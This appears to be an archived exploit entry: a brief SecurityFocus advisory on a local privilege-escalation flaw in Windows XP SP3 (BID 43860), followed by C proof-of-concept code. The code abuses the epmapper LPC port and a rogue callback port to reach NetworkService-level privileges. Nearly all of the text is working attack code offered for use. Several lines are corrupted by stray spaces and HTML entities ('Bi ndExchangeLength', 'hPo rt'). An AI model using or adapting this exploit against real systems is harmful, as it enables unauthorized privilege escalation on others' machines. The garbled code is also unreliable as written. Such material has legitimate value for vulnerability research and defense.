source: http://www.securityfocus.com/bid/43860/info

Microsoft Windows is prone to a local privilege-escalation vulnerability.

A local attacker can exploit this issue to execute arbitrary code and elevate their privileges to the NetworkService account level. Failed exploit attempts may cause a denial-of-service condition.

The issue affects Microsoft Windows XP SP3; other versions may also be affected.

#include <windows.h>
#include <stdio.h>
//#include "ntdll.h"
//#pragma  comment(lib,"ntdll.lib")
#pragma  comment(lib,"advapi32.lib")
 
typedef enum _PROCESSINFOCLASS {
ProcessDebugPort=7// 7 Y Y
} PROCESSINFOCLASS;
typedef struct _UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR Buffer;
} UNICODE_STRING ,*PUNICODE_STRING;
typedef struct _CLIENT_ID
{
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
}CLIENT_ID,* PCLIENT_ID, **PPCLIENT_ID;
#define PORT_NAME_LEN               64
#define LRPC_CONNECT_REQUEST     0
#define LPC_CONNECTION_REQUEST   10
#define    offset    0x100+0x4-0x6*4
#define    MAXLEN    0x148
#define    BACKNAME  L"\\RPC Control\\back2"
#define    RPCLPCNAME L"\\RPC Control\\epmapper"
#define    BINDNAME  L"back2"
typedef struct _LRPC_BIND_EXCHANGE
{
    INT                ConnectType ;
    DWORD         AssocKey ;
    char              szPortName[PORT_NAME_LEN] ;
    RPC_SYNTAX_IDENTIFIER InterfaceId;
    RPC_SYNTAX_IDENTIFIER TransferSyntax;
    RPC_STATUS RpcStatus;
    unsigned char fBindBack ;
    unsigned char fNewSecurityContext ;
    unsigned char fNewPresentationContext;
    unsigned char PresentationContext;
    unsigned char Pad[3];
    unsigned long SecurityContextId;
} LRPC_BIND_EXCHANGE;
typedef struct _LPC_MESSAGE
{
  USHORT                  DataSize;
  USHORT                  MessageSize;
  USHORT                  MessageType;
  USHORT                  DataInfoOffset;
  CLIENT_ID               ClientId;
  ULONG                   MessageId;
  ULONG                   SectionSize;
//  UCHAR    & nbsp;                 Data[];
}LPC_MESSAGE, *PLPC_MESSAGE;

typedef struct _OBJECT_ATTRIBUTES
{
    DWORD           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    DWORD           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
}OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES, **PPOBJECT_ATTRIBUTES;

typedef
DWORD
(CALLBACK * NTCREATEPORT)(
  OUT PHANDLE             PortHandle,
  IN POBJECT_ATTRIBUTES   ObjectAttributes,
  IN ULONG                MaxConnectInfoLength,
  IN ULONG                MaxDataLength,
  IN OUT PULONG           Reserved OPTIONAL );
typedef
DWORD
(CALLBACK * NTREPLYWAITRECVIVEPORT)(
  IN HANDLE               PortHandle,
  OUT PHANDLE             ReceivePortHandle OPTIONAL,
  IN PLPC_MESSAGE         Reply OPTIONAL,
  OUT PLPC_MESSAGE        IncomingRequest );

typedef
DWORD
(CALLBACK * NTACCEPTCONNECTPORT) (
    OUT PHANDLE PortHandle,
    IN PVOID PortContext OPTIONAL,
    IN PLPC_MESSAGE ConnectionRequest,
    IN BOOLEAN AcceptConnection,
    IN OUT int int1, //    IN OUT PPORT_VIEW ServerView OPTIONAL,
    OUT int int2  //OUT PREMOTE_PORT_VIEW ClientView OPTIONAL
    );
typedef
DWORD
(CALLBACK * NTCONNECTPORT)(
    OUT PHANDLE PortHandle,
    IN PUNICODE_STRING PortName,
    IN PSECURITY_QUALITY_OF_SERVICE SecurityQos,
    IN OUT int int1,
 //    IN OUT PPORT_VIEW ClientView OPTIONAL,
    IN OUT int int2,
 // IN OUT PREMOTE_PORT_VIEW ServerView OPTIONAL,
    OUT PULONG MaxMessageLength OPTIONAL,
    IN OUT PVOID ConnectionInformation OPTIONAL,
    IN OUT PULONG ConnectionInformationLength OPTIONAL
  );
typedef
DWORD
(CALLBACK *NTREQUESTWAITREPLYPORT)(   // NtRequestWaitReplyPort(
  IN  HANDLE               PortHandle,
  IN  PLPC_MESSAGE         Request,
  OUT PLPC_MESSAGE        IncomingReply );
typedef
DWORD
(CALLBACK *NTCOMPLETECONNECTPORT) (
    IN HANDLE PortHandle
    );
typedef
DWORD
(CALLBACK *RTLINITUNICODESTRING)(
    PUNICODE_STRING DestinationString,
    PCWSTR SourceString
    );
typedef
DWORD
(CALLBACK * NTREPLYPORT)(
  IN HANDLE               PortHandle,
  IN PLPC_MESSAGE         Reply );
typedef
DWORD
(CALLBACK * NTSETINFORMATIONPROCESS)(
  IN HANDLE               ProcessHandle,
  IN PROCESSINFOCLASS ProcessInformationClass,
  IN PVOID                ProcessInformation,
  IN ULONG                ProcessInformationLength );

typedef struct _DEBUG_MESSAGE
{
    LPC_MESSAGE        PORT_MSG;
    DEBUG_EVENT        DebugEvent;
}DEBUG_MESSAGE, *PDEBUG_MESSAGE;

NTSETINFORMATIONPROCESS    NtSetInformationProcess;
NTREPLYWAITRECVIVEPORT     NtReplyWaitReceivePort;
NTCREATEPORT               NtCreatePort;
NTREPLYPORT                NtReplyPort;
NTCONNECTPORT              NtConnectPort;
RTLINITUNICODESTRING       RtlInitUnicodeString;
NTREQUESTWAITREPLYPORT     NtRequestWaitReplyPort;
NTACCEPTCONNECTPORT        NtAcceptConnectPort;
NTCOMPLETECONNECTPORT      NtCompleteConnectPort;

template <int i> struct PORT_MESSAGEX : LPC_MESSAGE {
UCHAR Data[i];
};
PROCESS_INFORMATION    pi;
int   server();
void  initapi();
int main()
{
// LPC_MESSAGE         Reply;
//    HMODULE hNtdll;   
//    DWORD    dwAddrList[9];
    BOOL    bExit = FALSE;
//    DWORD    dwRet;
//    HANDLE    hPort;
    int        k=0;
 unsigned   long i;
//    DEBUG_MESSAGE dm;
    OBJECT_ATTRIBUTES oa = {sizeof(oa)};
    PORT_MESSAGEX<0x130> PortReply,PortRecv;
    STARTUPINFO    si={sizeof(si)};
   // NTSTATUS
 int  Status;
 
 PLPC_MESSAGE        Request;
// PLPC_MESSAGE        IncomingReply;
 LPC_MESSAGE         Message;
 HANDLE LsaCommandPortHandle;
    UNICODE_STRING LsaCommandPortName;
    SECURITY_QUALITY_OF_SERVICE DynamicQos;
 LRPC_BIND_EXCHANGE BindExchange;
 DWORD Key=0x11223344;
    unsigned long BindExchangeLength = sizeof(LRPC_BIND_EXCHANGE);
 BindExchange.ConnectType = LRPC_CONNECT_REQUEST ;
    BindExchange.AssocKey = Key;
//    wcscpy((wchar_t *)&(BindExchange.szPortName),BINDNAME);
 DynamicQos.ImpersonationLevel =SecurityAnonymous; // SecurityImpersonation;
    DynamicQos.ContextTrackingMode = SECURITY_STATIC_TRACKING; //SECURITY_DYNAMIC_TRACKING;
    DynamicQos.EffectiveOnly = TRUE;
    initapi();   
    printf( "\r\nwindows lpc test!\r\n");

 CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)server,0,0,&i);
 

 //
    // Connect to the Reference Monitor Command Port.  This port
    // is used to send commands from the LSA to the Reference Monitor.
    //
    RtlInitUnicodeString( &LsaCommandPortName,RPCLPCNAME);
    Status = NtConnectPort(
                 &LsaCommandPortHandle,
                 &LsaCommandPortName,
                 &DynamicQos,
                 NULL,
                 NULL,
                 NULL,    // &maxlen,
                 &BindExchange,
                 &Bi ndExchangeLength);
    if ((Status)) {

    exit(Status);
         //print(("LsapRmInitializeServer - Connect to Rm Command Port failed 0x%lx\n",Status));
        // goto InitServerError;
    }

//    exit(0);
/*
    //create port
    dwRet = NtCreatePort(&hPort, &oa, 0, 0x148, 0);
    if(dwRet != 0)
    {
        printf("create hPort failed. ret=%.8X\n", dwRet);
        return 0;
    }
    //create process
    if(!CreateProcess(0, "debugme.exe", NULL, NULL, TRUE,
        CREATE_SUSPENDED, 0, 0, &si, &pi))
    {
        printf("CreateProcess failed:%d\n", GetLastError());
        return 0;
    }
    //set debug port
    dwRet = NtSetInformationProcess(pi.hProcess, ProcessDebugPort,
        &hPort, sizeof(hPo rt));
    if(dwRet != 0)
    {
        printf("set debug port error:%.8X\n", dwRet);
        return 0;
    }
    //printf("pid:0x%.8X %d hPort=0x%.8X\n", pi.dwProcessId, pi.dwProcessId, hPort);
    ResumeThread(pi.hThread);
*/
    while (true)
    {
        memset(&Message, 0, sizeof(Message));
  
  Message.MessageSize=0x118;
  Message.DataSize=0x100;
  Message.MessageId=0x1122;
  Request=&Message;
 
 
 
    memset(&PortReply, 0, sizeof(PortReply));
        //    memcpy(&PortReply, &dm, sizeof(dm));
          
      memset(&PortReply, 0, sizeof(PortReply));
        //    memcpy(&PortReply, &dm, sizeof(dm));
            PortReply.MessageSize = 0x100;
            PortReply.DataSize = 0x100-0x18;
   PortReply.MessageType=0;
            PortReply.MessageId=0x1122;
            PortReply.Data[0]=0x0b;
            PortReply.Data[1]=0;
   PortReply.Data[2]=0;
   PortReply.Data[3]=0;
   PortReply.Data[4]=0;
            wcscpy((wchar_t *)&(PortReply.Data[0x10]),BINDNAME);
     Sleep(1000);
        Status=NtRequestWaitReplyPort(LsaCommandPortHandle,&PortReply,&PortRecv); //Reply);
     
  
          //  memcpy(&PortReply.Data[offset-4], &dwAddrList, sizeof(dwAddrList));
 
    PortReply.MessageSize = 0xa0;
            PortReply.DataSize = 0xa0-0x18;
   PortReply.MessageType=0;
            PortReply.MessageId=0x1122;
            PortReply.Data[0]=0x0;
            PortReply.Data[1]=0;
   PortReply.Data[2]=0;
   PortReply.Data[3]=0;
   PortReply.Data[4]=0;
            memcpy((unsigned char *)&(PortReply.Data[0x0c]),
       "\x80\xbd\xa8\xaf\x8a\x7d\xc9\x11\xbe\xf4\x08\x00\x2b\x10\x29\x89\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00",0x20);
   
//"\xe6\x73\x0c\xe6\xf9\x88\xcf\x11\x9a\xf1\x00\x20\xaf\x6e\x72\xf4\x02\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00",0x20);

          //  memcpy(&PortReply.Data[offset-4], &dwAddrList, sizeof(dwAddrList));
         
   _asm{
  // die: jmp die
   }
   Sleep(1000);
        Status=NtRequestWaitReplyPort(LsaCommandPortHandle,&PortReply,&PortRecv); //Reply);
 BindExchange=*(LRPC_BIND_EXCHANGE *)&(PortRecv.Data[8]);

            if (!(Status))
   {
    while(1){
       PortReply.MessageSize = 0x100;
                PortReply.DataSize = 0x100-0x18;
       PortReply.MessageType=0;
                PortReply.MessageId=PortRecv.MessageId;
                PortReply.Data[0]=0x01;
                PortReply.Data[1]=0;
       PortReply.Data[2]=0;
       PortReply.Data[3]=0;
       PortReply.Data[4]=0x3;
    PortReply.Data[5]=0;
    PortReply.Data[6]=0;
   
    
                *(int *)(&(PortReply.Data[0x18]))=*(int *)(&(PortRecv.Data[0x30]));
 
   _asm{
// die: jmp die
   }
               Sleep(100);
           Status=NtRequestWaitReplyPort(LsaCommandPortHandle,&PortReply,&PortRecv); //Reply);
   
          
          Sleep(0x7fffffff);
    }
   }
 } 

 
    return 0;
}

int server()
{
   BOOL    bExit = FALSE;
    DWORD    dwRet;
//    HANDLE    hPort;
    int        k=0;
 unsigned   long maxlen;
  //  DEBUG_MESSAGE dm;
    OBJECT_ATTRIBUTES oa = {sizeof(oa)};
    PORT_MESSAGEX<0x130> PortReply,PortRecv;
    STARTUPINFO    si={sizeof(si)};
   // NTSTATUS
 int  Status;
 
 PLPC_MESSAGE        Request;
 PLPC_MESSAGE        IncomingReply;
 LPC_MESSAGE         Message;
 HANDLE BackPortHandle,NewHandle,NewAccHandle;
    UNICODE_STRING BackPortName;
    SECURITY_QUALITY_OF_SERVICE DynamicQos;
 LRPC_BIND_EXCHANGE BindExchange;
 DWORD Key=0x11223344;
    unsigned long BindExchangeLength = sizeof(LRPC_BIND_EXCHANGE);
 BindExchange.ConnectType = LRPC_CONNECT_REQUEST ;
    BindExchange.AssocKey = Key;

 DynamicQos.ImpersonationLevel =SecurityAnonymous; // SecurityImpersonation;
    DynamicQos.ContextTrackingMode = SECURITY_STATIC_TRACKING; //SECURITY_DYNAMIC_TRACKING;
    DynamicQos.EffectiveOnly = TRUE;
   
   
 

    RtlInitUnicodeString( &BackPortName,BACKNAME);
 memset(&oa,0,sizeof(oa));
    oa.Length=0x18;
 oa.ObjectName=&BackPortName;
 oa.Attributes=0x40;

    //InitializeObjectAttributes(&oa,&BackPortName,0x40,0,0);
  //OBJ_CASE_INSENSITIVE,0,0); //SecurityDescriptor);
   
    //create port
    dwRet = NtCreatePort(&BackPortHandle, &oa, sizeof(LRPC_BIND_EXCHANGE),MAXLEN, 0);
    if(dwRet != 0)
    {
        printf("create hPort failed. ret=%.8X\n", dwRet);
       // return 0;
    }
   
    while (true)
    {
        memset(&Message, 0, sizeof(Message));
  
  Message.MessageSize=0x118;
  Message.DataSize=0x100;
  Message.MessageId=0x11;
  Request=&Message;
      memset(&PortReply, 0, sizeof(PortReply));
        //    memcpy(&PortReply, &dm, sizeof(dm));
            PortReply.MessageSize = 0x148;
            PortReply.DataSize = 0x130;
   PortReply.MessageType=0;
            PortReply.Data[0]=0x0b;
            PortReply.Data[1]=0;
   PortReply.Data[2]=0;
   PortReply.Data[3]=0;
   PortReply.Data[4]=0;
 
          //  memcpy(&PortReply.Data[offset-4], &dwAddrList, sizeof(dwAddrList));
        
        Status=NtReplyWaitReceivePort(BackPortHandle,0,0,&PortRecv); //Reply);
        if(PortRecv.MessageType==LPC_CONNECTION_REQUEST)
  {
  Status=NtAcceptConnectPort(&NewAccHandle, 0, &PortRecv,1, NULL, NULL);
  Status=NtCompleteConnectPort (NewAccHandle);
  
      memset(&PortRecv, 0, sizeof(PortRecv));
       
   Status=NtReplyWaitReceivePort(NewAccHandle,0,0,&PortRecv); //&PortReply,&PortRecv);
  
   while(1)
   {
   PortRecv.MessageSize = 0x148;
            PortRecv.DataSize = 0x130;
   
  // PortReply.MessageId=PortRecv.MessageId;
            _asm{
//die: jmp die
   }
   Status=NtReplyWaitReceivePort(NewAccHandle,0,&PortRecv,&PortRecv); //&PortReply,&PortRecv);
   Sleep(100);
   Status=NtReplyWaitReceivePort(NewAccHandle,0,0,&PortRecv); //&PortReply,&PortRecv);
   }
  }
 }
}

void initapi()
{
  HMODULE hNtdll;

    //get native api address
    hNtdll = LoadLibrary("ntdll.dll");
    if(hNtdll == NULL)
    {
        printf("LoadLibrary failed:%d\n", GetLastError());
    }
    NtReplyWaitReceivePort = (NTREPLYWAITRECVIVEPORT)
         GetProcAddress(hNtdll, "NtReplyWaitReceivePort");
    NtCreatePort = (NTCREATEPORT)
         GetProcAddress(hNtdll, "NtCreatePort");
    NtReplyPort = (NTREPLYPORT)
         GetProcAddress(hNtdll, "NtReplyPort");
    NtSetInformationProcess = (NTSETINFORMATIONPROCESS)
         GetProcAddress(hNtdll, "NtSetInformationProcess");
 NtRequestWaitReplyPort= (NTREQUESTWAITREPLYPORT)
   GetProcAddress(hNtdll,"NtRequestWaitReplyPort");
 
 NtConnectPort  =             (NTCONNECTPORT)
      GetProcAddress(hNtdll, "NtConnectPort");
 NtCompleteConnectPort  =     (NTCOMPLETECONNECTPORT)
      GetProcAddress(hNtdll, "NtCompleteConnectPort");
 NtAcceptConnectPort  =     (NTACCEPTCONNECTPORT)
      GetProcAddress(hNtdll, "NtAcceptConnectPort");
    RtlInitUnicodeString=(RTLINITUNICODESTRING)
         GetProcAddress(hNtdll,"RtlInitUnicodeString");
   
}

